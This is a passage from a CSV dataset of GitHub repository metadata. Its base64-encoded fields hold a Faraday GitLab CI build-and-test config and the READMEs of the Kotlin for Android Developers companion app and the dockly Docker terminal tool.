name,id,description,language,open_issues,stargazers_count,topics,watchers,fork,forks_url,readme,config,travis0,travis1,travis2,travis3,travis4,travis5,travis6,travis7,travis8,travis9,travis10,travis11,travis12,travis13,travis14,travis15,travis16,travis17,travis18,travis19,travis20,travis21,travis22,travis23,gitlab0,gitlab1,gitlab2,gitlab3,gitlab4,gitlab5,gitlab6,gitlab7,gitlab8,gitlab9,gitlab10,gitlab11,gitlab12,gitlab13,gitlab14,gitlab15,gitlab16,gitlab17,gitlab18,gitlab19,gitlab20,gitlab21,gitlab22,gitlab23,jenkinsPipeline0,jenkinsPipeline1,jenkinsPipeline2,jenkinsPipeline3,jenkinsPipeline4,jenkinsPipeline5,jenkinsPipeline6,jenkinsPipeline7,jenkinsPipeline8,jenkinsPipeline9,jenkinsPipeline10,jenkinsPipeline11,jenkinsPipeline12,jenkinsPipeline13,jenkinsPipeline14,jenkinsPipeline15,jenkinsPipeline16,jenkinsPipeline17,jenkinsPipeline18,jenkinsPipeline19,jenkinsPipeline20,jenkinsPipeline21,jenkinsPipeline22,jenkinsPipeline23,cirrus0,cirrus1,cirrus2,cirrus3,cirrus4,cirrus5,cirrus6,cirrus7,cirrus8,cirrus9,cirrus10,cirrus11,cirrus12,cirrus13,cirrus14,cirrus15,cirrus16,cirrus17,cirrus18,cirrus19,cirrus20,cirrus21,cirrus22,cirrus23,github0,github1,github2,github3,github4,github5,github6,github7,github8,github9,github10,github11,github12,github13,github14,github15,github16,github17,github18,github19,github20,github21,github22,github23,cds0,cds1,cds2,cds3,cds4,cds5,cds6,cds7,cds8,cds9,cds10,cds11,cds12,cds13,cds14,cds15,cds16,cds17,cds18,cds19,cds20,cds21,cds22,cds23,azure0,azure1,azure2,azure3,azure4,azure5,azure6,azure7,azure8,azure9,azure10,azure11,azure12,azure13,azure14,azure15,azure16,azure17,azure18,azure19,azure20,azure21,azure22,azure23,circleci0,circleci1,circleci2,circleci3,circleci4,circleci5,circleci6,circleci7,circleci8,circleci9,circleci10,circleci11,circleci12,circleci13,circleci14,circleci15,circleci16,circleci17,circleci18,circleci19,circleci20,circleci21,circleci22,circleci23,bitbucket0,bitbucket1,bitbucket2,bitbucket3,bitbucket4,bitbucket5,bitbucket6,bitbucket7,bitbucket8,bitbucket9,bitbucket10,bitbucket11,bitbucket12,bitbucket13,bitbucket14,bitbucket15,bitbucket16,bitbucket17,bitbucket18,bitbucket19,bitbucket20,bitbucket21,bitbucket22,bitbucket23
LS1vbmVmaWxlIC0taWNvbj1mYXJhZGF5L2ZhcmFkYXkvc2VydmVyL3d3dy9m
YXZpY29uLmljbyBmcGx1Z2luLnNwZWMKICAgICAgICAtIHB5aW5zdGFsbGVy
IC1GIC13IC0tb25lZmlsZSAtLWljb249ZmFyYWRheS9mYXJhZGF5L3NlcnZl
ci93d3cvZmF2aWNvbi5pY28gc2VhcmNoZXIuc3BlYwogICAgICAgIC0gbWtk
aXIgb3V0cHV0CiAgICAgICAgLSBtdiBkaXN0L3N0YXJ0X2NsaWVudCBvdXRw
dXQvZmFyYWRheS1jbGllbnQKICAgICAgICAtIG12IGRpc3Qvc3RhcnRfc2Vy
dmVyIG91dHB1dC9mYXJhZGF5LXNlcnZlcgogICAgICAgIC0gbXYgZGlzdC9t
YW5hZ2Ugb3V0cHV0L2ZhcmFkYXktbWFuYWdlCiAgICAgICAgLSBtdiBkaXN0
L2ZwbHVnaW4gb3V0cHV0L2ZhcmFkYXktZnBsdWdpbgogICAgICAgIC0gbXYg
ZGlzdC9zZWFyY2hlciBvdXRwdXQvZmFyYWRheS1zZWFyY2hlcgogICAgICAg
IC0gdGFyIC16Y3ZmIGxpbnV4LWJpbmFyaWVzLnRhci5neiBvdXRwdXQKICAg
IGFydGlmYWN0czoKICAgICAgICBuYW1lOiAiJENJX0pPQl9OQU1FLSRDSV9D
T01NSVRfUkVGX05BTUUtYmluYXJpZXMiCiAgICAgICAgcGF0aHM6CiAgICAg
ICAgICAgIC0gbGludXgtYmluYXJpZXMudGFyLmd6CiAgICAgICAgZXhwaXJl
X2luOiAxIHdlZWsKICAgIG9ubHk6CiAgICAgICAgdmFyaWFibGVzOgogICAg
ICAgICAgICAtICRDSV9DT01NSVRfUkVGX05BTUUgPX4gL14uKlwvKG1hc3Rl
cikkLwogICAgICAgICAgICAtICRDSV9DT01NSVRfVEFHCiAgICAgICAgICAg
IC0gJEJVSUxEX1RFU1QKICAgICAgICAgICAgLSAkRlVMTF9URVNUCiAgICAg
ICAgICAgIC0gJERBSUxZX1RFU1QKCm1hY29zX2RtZzoKICAgIHRhZ3M6CiAg
ICAgICAgLSBtYWNvcwogICAgc3RhZ2U6IGJ1aWxkCiAgICBhbGxvd19mYWls
dXJlOiB0cnVlCiAgICBzY3JpcHQ6CiAgICAgICAgLSBwaXAgaW5zdGFsbCB2
aXJ0dWFsZW52CiAgICAgICAgLSB2aXJ0dWFsZW52IC1wIHB5dGhvbjIgZmFy
YWRheV92ZW52CiAgICAgICAgLSBzb3VyY2UgZmFyYWRheV92ZW52L2Jpbi9h
Y3RpdmF0ZQogICAgICAgIC0gZXhwb3J0IFBLR19DT05GSUdfUEFUSD0iJHtQ
S0dfQ09ORklHX1BBVEh9Oi91c3IvbG9jYWwvb3B0L2xpYmZmaS9saWIvcGtn
Y29uZmlnIgogICAgICAgIC0gcGlwIGluc3RhbGwgcHlpbnN0YWxsZXIKICAg
ICAgICAtIHBpcCBpbnN0YWxsIC0tdXBncmFkZSAtciByZXF1aXJlbWVudHMu
dHh0CiAgICAgICAgLSBweXRob24gc2V0dXAucHkgaW5zdGFsbAogICAgICAg
IC0gcGlwIGluc3RhbGwgLltndGtdCiAgICAgICAgLSBweWluc3RhbGxlciAt
RiAtdyAtLW9uZWZpbGUgLS1vbmVmaWxlIC0taWNvbj1mYXJhZGF5L2ZhcmFk
YXkvc2VydmVyL3d3dy9mYXZpY29uLmljbyBzdGFydF9zZXJ2ZXIuc3BlYwog
ICAgICAgIC0gcHlpbnN0YWxsZXIgLUYgLXcgLS1vbmVmaWxlIC0tb25lZmls
ZSAtLWljb249ZmFyYWRheS9mYXJhZGF5L3NlcnZlci93d3cvZmF2aWNvbi5p
Y28gbWFuYWdlLnNwZWMKICAgICAgICAtIHB5aW5zdGFsbGVyIC1GIC13IC0t
b25lZmlsZSAtLW9uZWZpbGUgLS1pY29uPWZhcmFkYXkvZmFyYWRheS9zZXJ2
ZXIvd3d3L2Zhdmljb24uaWNvIHN0YXJ0X2NsaWVudC5zcGVjCiAgICAgICAg
LSBweWluc3RhbGxlciAtRiAtdyAtLW9uZWZpbGUgLS1pY29uPWZhcmFkYXkv
ZmFyYWRheS9zZXJ2ZXIvd3d3L2Zhdmljb24uaWNvIGZwbHVnaW4uc3BlYwog
ICAgICAgIC0gcHlpbnN0YWxsZXIgLUYgLXcgLS1vbmVmaWxlIC0taWNvbj1m
YXJhZGF5L2ZhcmFkYXkvc2VydmVyL3d3dy9mYXZpY29uLmljbyBzZWFjaGVy
LnNwZWMKICAgICAgICAtIG1rZGlyIG91dHB1dAogICAgICAgIC0gbXYgZGlz
dC9zdGFydF9jbGllbnQgb3V0cHV0L2ZhcmFkYXktY2xpZW50CiAgICAgICAg
LSBtdiBkaXN0L3N0YXJ0X3NlcnZlciBvdXRwdXQvZmFyYWRheS1zZXJ2ZXIK
ICAgICAgICAtIG12IGRpc3QvbWFuYWdlIG91dHB1dC9mYXJhZGF5LW1hbmFn
ZQogICAgICAgIC0gbXYgZGlzdC9mcGx1Z2luIG91dHB1dC9mYXJhZGF5LWZw
bHVnaW4KICAgICAgICAtIG12IGRpc3Qvc2VhcmNoZXIgb3V0cHV0L2ZhcmFk
YXktc2VhcmNoZXIKICAgICAgICAtIGhkaXV0aWwgY3JlYXRlIC90bXAvdG1w
LmRtZyAtb3YgLXZvbG5hbWUgIkZhcmFkYXkiIC1mcyBIRlMrIC1zcmNmb2xk
ZXIgIi4vb3V0cHV0IgogICAgICAgIC0gaGRpdXRpbCBjb252ZXJ0IC90bXAv
dG1wLmRtZyAtZm9ybWF0IFVEWk8gLW8gRmFyYWRheS5kbWcKICAgIGFydGlm
YWN0czoKICAgICAgICBuYW1lOiAiJENJX0pPQl9OQU1FLSRDSV9DT01NSVRf
UkVGX05BTUUtYmluYXJpZXMiCiAgICAgICAgcGF0aHM6CiAgICAgICAgICAg
IC0gRmFyYWRheS5kbWcKICAgICAgICBleHBpcmVfaW46IDEgd2VlawogICAg
b25seToKICAgICAgICB2YXJpYWJsZXM6CiAgICAgICAgICAgIC0gJENJX0NP
TU1JVF9SRUZfTkFNRSA9fiAvXi4qXC8obWFzdGVyKSQvCiAgICAgICAgICAg
IC0gJENJX0NPTU1JVF9UQUcKICAgICAgICAgICAgLSAkQlVJTERfVEVTVAog
ICAgICAgICAgICAtICRGVUxMX1RFU1QKICAgICAgICAgICAgLSAkREFJTFlf
VEVTVAoKZG9jdW1lbnRhdGlvbjoKICAgIGltYWdlOiBweXRob246MwogICAg
c3RhZ2U6IHBvc3RfdGVzdGluZwogICAgc2NyaXB0OgogICAgICAgIC0gYXB0
LWdldCB1cGRhdGUgLXF5CiAgICAgICAgLSBhcHQtZ2V0IGluc3RhbGwgLXkg
LW8gZGlyOjpjYWNoZTo6YXJjaGl2ZXM9IiRBUFRfQ0FDSEVfRElSIiBweXRo
b24tcGlwIHB5dGhvbi1kZXYKICAgICAgICAtIHBpcCBpbnN0YWxsIHNwaGlu
eAogICAgICAgIC0gY2QgZG9jICYmIG1ha2UgaHRtbAogICAgYXJ0aWZhY3Rz
OgogICAgICAgIHBhdGhzOgogICAgICAgICAgICAtIGRvYy9fYnVpbGQvaHRt
bAogICAgb25seToKICAgICAgICB2YXJpYWJsZXM6CiAgICAgICAgICAgIC0g
JEZVTExfRE9DCiAgICAgICAgICAgIC0gJERPQwogICAgICAgICAgICAtICRD
SV9DT01NSVRfUkVGX05BTUUgPX4gL14uKlwvKGRldnxtYXN0ZXIpJC8KCgp0
ZXN0X2h5cG90aGVzaXM6CiAgICB0YWdzOgogICAgICAgIC0gaHlwb3RoZXNp
cwogICAgaW1hZ2U6IHJlZ2lzdHJ5LmdpdGxhYi5jb20vZmFyYWRheXNlYy9m
YXJhZGF5L2ZhcmFkYXlfdGVzdGluZ19iYXNlCiAgICBzdGFnZTogdGVzdGlu
ZwogICAgYWxsb3dfZmFpbHVyZTogdHJ1ZQogICAgc2NyaXB0OgogICAgICAg
IC0gYXB0LWdldCB1cGRhdGUgLXF5CiAgICAgICAgLSBwaXAgaW5zdGFsbCB2
aXJ0dWFsZW52CiAgICAgICAgLSB2aXJ0dWFsZW52IC1wIHB5dGhvbjIgZmFy
YWRheV92ZW52CiAgICAgICAgLSBzb3VyY2UgZmFyYWRheV92ZW52L2Jpbi9h
Y3RpdmF0ZQogICAgICAgICMtIHBpcCBpbnN0YWxsIC0tdXBncmFkZSAtciBy
ZXF1aXJlbWVudHNfc2VydmVyLnR4dAogICAgICAgIC0gcHl0aG9uIHNldHVw
LnB5IGluc3RhbGwKICAgICAgICAtIHBpcCBpbnN0YWxsIC0tdXBncmFkZSBy
ZXNwb25zZXMgcHl0ZXN0LXhkaXN0IHB5dGVzdC1jb3YKICAgICAgICAtIHBp
cCBpbnN0YWxsIC0tdXBncmFkZSAtciByZXF1aXJlbWVudHNfZGV2LnR4dAog
ICAgICAgIC0gbWtkaXIgLXAgfi8uZmFyYWRheS9jb25maWcKICAgICAgICAt
IGNwIHRlc3RzL2RhdGEvc2VydmVyLmluaSB+Ly5mYXJhZGF5L2NvbmZpZwog
ICAgICAgICMtIHNlZCAtaSAncy9tYXBwZWRfdGFibGUvcGVyc2lzdF9zZWxl
Y3RhYmxlLycgZmFyYWRheV92ZW52L2xpYi9weXRob24yLjcvc2l0ZS1wYWNr
YWdlcy9mbGFza19zcWxhbGNoZW15L19faW5pdF9fLnB5ICAjIFRPRE8gcmVt
b3ZlIHdoZW4gZmxhc2tfc3FsYWxjaGVteSBmaXhlcyB0aGUgaXNzdWUKICAg
ICAgICAtIHB5dGVzdCB0ZXN0cyAtdiAtLWNvdj1mYXJhZGF5L3NlcnZlci9h
cGkgLS1jb25uZWN0aW9uLXN0cmluZz1wb3N0Z3Jlc3FsK3BzeWNvcGcyOi8v
JFBPU1RHUkVTX1VTRVI6JFBPU1RHUkVTX1BBU1NXT1JEQHBvc3RncmVzLyRQ
T1NUR1JFU19EQiAtbSBoeXBvdGhlc2lzCiAgICBvbmx5OgogICAgICAgIHZh
cmlhYmxlczoKICAgICAgICAgICAgLSAkRlVMTF9URVNUCiAgICAgICAgICAg
IC0gJEhZUE9fVEVTVAogICAgICAgICAgICAtICREQUlMWV9URVNUCg==
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'Kotlin-for-Android-Developers',38667206,b'Companion App for the book',b'Kotlin',6,2390,,2390,False,b'https://api.github.com/repos/antoniolg/Kotlin-for-Android-Developers/forks',"IyBLb3RsaW4gZm9yIEFuZHJvaWQgRGV2ZWxvcGVycyAodGhlIGJvb2spCgpU
aGlzIGlzIHRoZSBjb2RlIHlvdSBjYW4gdXNlIHRvIGZvbGxvdyB0aGUgYm9v
ay4KCltodHRwczovL2FudG9uaW9sZWl2YS5jb20va290bGluLWFuZHJvaWQt
ZGV2ZWxvcGVycy1ib29rL10oaHR0cHM6Ly9hbnRvbmlvbGVpdmEuY29tL2tv
dGxpbi1hbmRyb2lkLWRldmVsb3BlcnMtYm9vay8pCgpBcmUgeW91IHRpcmVk
IG9mIHVzaW5nIGFuIGFuY2llbnQsIGluZXhwcmVzc2l2ZSBhbmQgdW5zYWZl
IGxhbmd1YWdlIHRvIGRldmVsb3AgeW91ciBBbmRyb2lkIGFwcHM/IERvIHlv
dSBjcnkgb3V0IGxvdWQgZXZlcnkgdGltZSB5b3Ugc2VlIGEgTnVsbCBQb2lu
dGVyIEV4Y2VwdGlvbiBpbiB5b3VyIGJ1ZyB0cmFja2VyPyBUaGVuIEtvdGxp
biBpcyB5b3VyIHNvbHV0aW9uISBBIGxhbmd1YWdlIHNwZWNpZmljYWxseSBj
cmVhdGVkIGZvciBKYXZhIGRldmVsb3BlcnMsIGVhc3kgdG8gbGVhcm4sIGV4
cHJlc3NpdmUsIG51bGwgc2FmZSBhbmQgcmVhbGx5IGludHVpdGl2ZS4gWW91
ciBwcm9kdWN0aXZpdHkgd2lsbCBib29zdCBhbmQgeW91ciBhcHBzIHdpbGwg
YmVjb21lIG1vcmUgcm9idXN0LiBMZWFybiBLb3RsaW4gdGhlIGVhc3kgd2F5
IGJ5IGV4YW1wbGUgYW5kIGRpc2NvdmVyIHRoZSB0cmlja3MgdGhhdCB3aWxs
IG1ha2UgY29kaW5nIGVhc2llci4KCkFuZCBub3csIGl0J3Mgb2ZmaWNpYWxs
eSBzdXBwb3J0ZWQgYnkgR29vZ2xlIQoKIVtLb3RsaW4gZm9yIEFuZHJvaWQg
RGV2ZWxvcGVycyBjb3Zlcl0oYXJ0L2tvdGxpbi1hbmRyb2lkLWRldmVsb3Bl
cnMucG5nP3Jhdz10cnVlKQoKIyMgQWJvdXQgdGhlIGJvb2sKCltJbiB0aGlz
IGJvb2tdKGh0dHBzOi8vYW50b25pb2xlaXZhLmNvbS9rb3RsaW4tYW5kcm9p
ZC1kZXZlbG9wZXJzLWJvb2svKSwgSSdsbCBiZSBjcmVhdGluZyBhbiBBbmRy
b2lkIGFwcCBmcm9tIGdyb3VuZCB1c2luZyBLb3RsaW4gYXMgdGhlIG1haW4g
bGFuZ3VhZ2UuIFRoZSBpZGVhIGlzIHRvIGxlYXJuIHRoZSBsYW5ndWFnZSBi
eSBleGFtcGxlLCBpbnN0ZWFkIG9mIGZvbGxvd2luZyBhIHR5cGljYWwgc3Ry
dWN0dXJlLiBJJ2xsIGJlIHN0b3BwaW5nIHRvIGV4cGxhaW4gdGhlIG1vc3Qg
aW50ZXJlc3RpbmcgY29uY2VwdHMgYW5kIGlkZWFzIGFib3V0IEtvdGxpbiwg
Y29tcGFyaW5nIGl0IHdpdGggSmF2YSA3LiBUaGlzIHdheSwgeW91IGNhbiBz
ZWUgd2hhdCB0aGUgZGlmZmVyZW5jZXMgYXJlIGFuZCB3aGljaCBwYXJ0cyBv
ZiB0aGUgbGFuZ3VhZ2Ugd2lsbCBoZWxwIHlvdSBzcGVlZCB1cCB5b3VyIHdv
cmsuCgpbVGhpcyBib29rXShodHRwczovL2FudG9uaW9sZWl2YS5jb20va290
bGluLWFuZHJvaWQtZGV2ZWxvcGVycy1ib29rLykgaXMgbm90IG1lYW50IHRv
IGJlIGEgbGFuZ3VhZ2UgcmVmZXJlbmNlLCBidXQgYSB0b29sIGZvciBBbmRy
b2lkIGRldmVsb3BlcnMgdG8gbGVhcm4gS290bGluIGFuZCBiZSBhYmxlIHRv
IGNvbnRpbnVlIHdpdGggdGhlaXIgb3duIHByb2plY3RzIGJ5IHRoZW1zZWx2
ZXMuIEknbGwgYmUgc29sdmluZyBtYW55IG9mIHRoZSB0eXBpY2FsIHByb2Js
ZW1zIHdlIGhhdmUgdG8gZmFjZSBpbiBvdXIgZGFpbHkgbGl2ZXMgYnkgbWFr
aW5nIHVzZSBvZiB0aGUgbGFuZ3VhZ2UgZXhwcmVzc2l2ZW5lc3MgYW5kIHNv
bWUgb3RoZXIgcmVhbGx5IGludGVyZXN0aW5nIHRvb2xzIGFuZCBsaWJyYXJp
ZXMuCgpbVGhlIGJvb2tdKGh0dHBzOi8vYW50b25pb2xlaXZhLmNvbS9rb3Rs
aW4tYW5kcm9pZC1kZXZlbG9wZXJzLWJvb2svKSBpcyB2ZXJ5IHByYWN0aWNh
bCwgc28gaXQgaXMgcmVjb21tZW5kZWQgdG8gZm9sbG93IHRoZSBleGFtcGxl
cyBhbmQgdGhlIGNvZGUgaW4gZnJvbnQgb2YgYSBjb21wdXRlciBhbmQgdHJ5
IGV2ZXJ5dGhpbmcgaXQncyBzdWdnZXN0ZWQuIFlvdSBjb3VsZCwgaG93ZXZl
ciwgdGFrZSBhIGZpcnN0IHJlYWQgdG8gZ2V0IGEgYnJvYWQgaWRlYSBhbmQg
dGhlbiBkaXZlIGludG8gcHJhY3RpY2UuCgojIyBWZXJzaW9ucwoKQXMgSSB1
cGRhdGUgdGhlIGJvb2ssIEkgbmVlZCB0byBwdXNoIC1mIHRoaXMgcmVwb3Np
dG9yeSB3aXRoIHRoZSBuZXcgY2hhbmdlcywgc28gdGhhdCBpdCBtYXRjaGVz
IHdpdGggdGhlIG5ldyB0ZXh0LgoKVGhhdCBtZWFucyB0aGF0IGlmIHlvdSBh
cmUgcmVhZGluZyBhbiBvbGQgdmVyc2lvbiBvZiB0aGUgYm9vaywgbWFpbiBi
cmFuY2hlcyB3b24ndCBiZSBhbGlnbmVkIHdpdGggeW91ciB0ZXh0LgoKVG8g
bWFrZSB0aGluZ3MgZWFzaWVyLCBJJ2xsIGtlZXAgdHJhY2sgb2YgdGhvc2Ug
dmVyc2lvbnMgaW4gc2VwYXJhdGVzIGJyYW5jaGVzLCB3aGljaCB3aWxsIGJl
IGxpbmtlZCBmcm9tIGhlcmU6CgotIDd0aCBlZGl0aW9uOiBGZWJydWFyeSAy
MDE5IChjdXJyZW50KQotIDZ0aCBlZGl0aW9uOiBbQXByaWwgMjAxOF0oaHR0
cHM6Ly9naXRodWIuY29tL2FudG9uaW9sZy9Lb3RsaW4tZm9yLUFuZHJvaWQt
RGV2ZWxvcGVycy90cmVlL21hc3Rlci1hcHJpbC0yMDE4KQotIFs1dGggZWRp
dGlvbjogU2VwdGVtYmVyIDIwMTddKGh0dHBzOi8vZ2l0aHViLmNvbS9hbnRv
bmlvbGcvS290bGluLWZvci1BbmRyb2lkLURldmVsb3BlcnMvdHJlZS9tYXN0
ZXItc2VwdGVtYmVyLTIwMTcpCi0gWzR0aCBlZGl0aW9uOiBKdWx5IDIwMTdd
KGh0dHBzOi8vZ2l0aHViLmNvbS9hbnRvbmlvbGcvS290bGluLWZvci1BbmRy
b2lkLURldmVsb3BlcnMvdHJlZS9tYXN0ZXItanVseS0yMDE3KQotIFszcmQg
ZWRpdGlvbjogSnVuZSAyMDE3XShodHRwczovL2dpdGh1Yi5jb20vYW50b25p
b2xnL0tvdGxpbi1mb3ItQW5kcm9pZC1EZXZlbG9wZXJzL3RyZWUvbWFzdGVy
LWp1bmUtMjAxNykKLSBbMm5kIGVkaXRpb246IEphbnVhcnkgMjAxN10oaHR0
cHM6Ly9naXRodWIuY29tL2FudG9uaW9sZy9Lb3RsaW4tZm9yLUFuZHJvaWQt
RGV2ZWxvcGVycy90cmVlL21hc3Rlci1qYW51YXJ5LTIwMTcpCi0gWzFzdCBl
ZGl0aW9uOiBNYXJjaCAyMDE2XShodHRwczovL2dpdGh1Yi5jb20vYW50b25p
b2xnL0tvdGxpbi1mb3ItQW5kcm9pZC1EZXZlbG9wZXJzL3RyZWUvbWFzdGVy
LW1hcmNoLTIwMTYpCgojIyBMaWNlbnNlCgogICAgQ29weXJpZ2h0IDIwMTkg
QW50b25pbyBMZWl2YQoKICAgIExpY2Vuc2VkIHVuZGVyIHRoZSBBcGFjaGUg
TGljZW5zZSwgVmVyc2lvbiAyLjAgKHRoZSAiTGljZW5zZSIpOwogICAgeW91
IG1heSBub3QgdXNlIHRoaXMgZmlsZSBleGNlcHQgaW4gY29tcGxpYW5jZSB3
aXRoIHRoZSBMaWNlbnNlLgogICAgWW91IG1heSBvYnRhaW4gYSBjb3B5IG9m
IHRoZSBMaWNlbnNlIGF0CgogICAgICAgaHR0cDovL3d3dy5hcGFjaGUub3Jn
L2xpY2Vuc2VzL0xJQ0VOU0UtMi4wCgogICAgVW5sZXNzIHJlcXVpcmVkIGJ5
IGFwcGxpY2FibGUgbGF3IG9yIGFncmVlZCB0byBpbiB3cml0aW5nLCBzb2Z0
d2FyZQogICAgZGlzdHJpYnV0ZWQgdW5kZXIgdGhlIExpY2Vuc2UgaXMgZGlz
dHJpYnV0ZWQgb24gYW4gIkFTIElTIiBCQVNJUywKICAgIFdJVEhPVVQgV0FS
UkFOVElFUyBPUiBDT05ESVRJT05TIE9GIEFOWSBLSU5ELCBlaXRoZXIgZXhw
cmVzcyBvciBpbXBsaWVkLgogICAgU2VlIHRoZSBMaWNlbnNlIGZvciB0aGUg
c3BlY2lmaWMgbGFuZ3VhZ2UgZ292ZXJuaW5nIHBlcm1pc3Npb25zIGFuZAog
ICAgbGltaXRhdGlvbnMgdW5kZXIgdGhlIExpY2Vuc2Uu
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'dockly',71667498,b'Immersive terminal interface for managing docker containers and services',b'JavaScript',5,2390,,2390,False,b'https://api.github.com/repos/lirantal/dockly/forks',"PHAgYWxpZ249ImNlbnRlciI+Cgk8YnI+CiAgPGltZyB3aWR0aD0iMjAwIiBz
cmM9Imh0dHBzOi8vdXNlci1pbWFnZXMuZ2l0aHVidXNlcmNvbnRlbnQuY29t
LzMxNjM3MS8yODkzNzQxNC02N2VlNWZmYS03ODkzLTExZTctOTVmOS01MDU5
Y2FjZjkxNzAucG5nIj4KCTxicj4KIEltbWVyc2l2ZSB0ZXJtaW5hbCBpbnRl
cmZhY2UgZm9yIG1hbmFnaW5nIGRvY2tlciBjb250YWluZXJzIGFuZCBzZXJ2
aWNlcwo8L3A+CgoKWyFbTm9kZSBWZXJzaW9uXShodHRwczovL2ltZy5zaGll
bGRzLmlvL2JhZGdlL25vZGUtJTNFPTcuNi4wLWJyaWdodGdyZWVuLnN2Zyld
KCkKWyFbdmlldyBvbiBucG1dKGh0dHA6Ly9pbWcuc2hpZWxkcy5pby9ucG0v
di9kb2NrbHkuc3ZnKV0oaHR0cHM6Ly93d3cubnBtanMub3JnL3BhY2thZ2Uv
ZG9ja2x5KQpbIVt2aWV3IG9uIG5wbV0oaHR0cDovL2ltZy5zaGllbGRzLmlv
L25wbS9sL2RvY2tseS5zdmcpXShodHRwczovL3d3dy5ucG1qcy5vcmcvcGFj
a2FnZS9kb2NrbHkpClshW25wbSBtb2R1bGUgZG93bmxvYWRzXShodHRwOi8v
aW1nLnNoaWVsZHMuaW8vbnBtL2R0L2RvY2tseS5zdmcpXShodHRwczovL3d3
dy5ucG1qcy5vcmcvcGFja2FnZS9kb2NrbHkpClshW0tub3duIFZ1bG5lcmFi
aWxpdGllc10oaHR0cHM6Ly9zbnlrLmlvL3Rlc3QvbnBtL2RvY2tseS9iYWRn
ZS5zdmcpXShodHRwczovL3NueWsuaW8vdGVzdC9ucG0vZG9ja2x5KQpbIVtT
ZWN1cml0eSBSZXNwb25zaWJsZSBEaXNjbG9zdXJlXShodHRwczovL2ltZy5z
aGllbGRzLmlvL2JhZGdlL1NlY3VyaXR5LVJlc3BvbnNpYmxlJTIwRGlzY2xv
c3VyZS15ZWxsb3cuc3ZnKV0oLi9TRUNVUklUWS5tZAopCgrwn4yfIEZlYXR1
cmVkIG9uIFshW0F3ZXNvbWUgRG9ja2VyXShodHRwczovL2Nkbi5yYXdnaXQu
Y29tL3NpbmRyZXNvcmh1cy9hd2Vzb21lL2Q3MzA1ZjM4ZDI5ZmVkNzhmYTg1
NjUyZTNhNjNlMTU0ZGQ4ZTg4MjkvbWVkaWEvYmFkZ2Uuc3ZnKV0oaHR0cHM6
Ly9naXRodWIuY29tL3ZlZ2dpZW1vbmsvYXdlc29tZS1kb2NrZXIpIFshW0Rl
dk9wcyBXZWVrbHldKGh0dHBzOi8vaW1nLnNoaWVsZHMuaW8vYmFkZ2UvRGV2
T3BzV2Vla2x5LSVGMCU5RiU5NSVCNi15ZWxsb3cuc3ZnCildKGh0dHA6Ly9k
ZXZvcHN3ZWVrbHkuY29tKSAKWyFbdGVybWluYWxzIGFyZSBzZXh5XShodHRw
czovL2ltZy5zaGllbGRzLmlvL2JhZGdlL1Rlcm1pbmFsc0FyZVNleHktJUYw
JTlGJTkyJUJCLWdyZWVuLnN2ZwopXShodHRwczovL2dpdGh1Yi5jb20vazRt
NC90ZXJtaW5hbHMtYXJlLXNleHkpIAoKCgohW2RvY2tseS1kZW1vLTJdKGh0
dHBzOi8vY2xvdWQuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Fzc2V0cy8zMTYz
NzEvMjU2ODI4NjcvYzUyMTIyMTYtMzAyNy0xMWU3LThmMzYtNzJkMzg1MTZk
MmFmLmdpZikKCiMgSW5zdGFsbApJbnN0YWxsIHRoZSBBUEkgbW9kdWxlIGFz
IGEgZGVwZW5kZW5jeSBpbiB5b3VyIHByb2plY3Qgc28geW91IGNhbiBlYXNp
bHkgdXNlIGl0IHRvIHF1ZXJ5IE9wZXJhdGlvbnMgT3JjaGVzdHJhdGlvbiBS
RVNUIEFQSQoKYGBgamF2YXNjcmlwdApucG0gaW5zdGFsbCAtZyBkb2NrbHkK
YGBgCgojIFVzYWdlCgpKdXN0IGZpcmUgdXAgZG9ja2x5IGFuZCBpdCB3aWxs
IGF1dG9tYXRpY2FsbHkgY29ubmVjdCB0byB5b3VyIGxvY2FsaG9zdCBkb2Nr
ZXIgZGFlbW9uIHRocm91Z2ggdGhlIHVuaXggc29ja2V0OgoKYGBgCmRvY2ts
eQpgYGAKCiMjIENvbW1hbmQgbGluZSBvcHRpb25zOgoKSXQncyBhbHNvIHBv
c3NpYmxlIHRvIHByb3ZpZGUgY29tbWFuZCBsaW5lIG9wdGlvbnMgZm9yIGRv
Y2tseSB0byBjdXN0b21pemUgdGhlIGRvY2tlciBjb25uZWN0aW9uCgp8IFBh
cmFtIHwgVHlwZSB8IERlc2NyaXB0aW9uIHwKfCAtLS0gfCAtLS0gfCAtLS0g
fAp8IC1zIG9yIC0tc29ja2V0UGF0aCB8IHN0cmluZyB8IERvY2tlciBzb2Nr
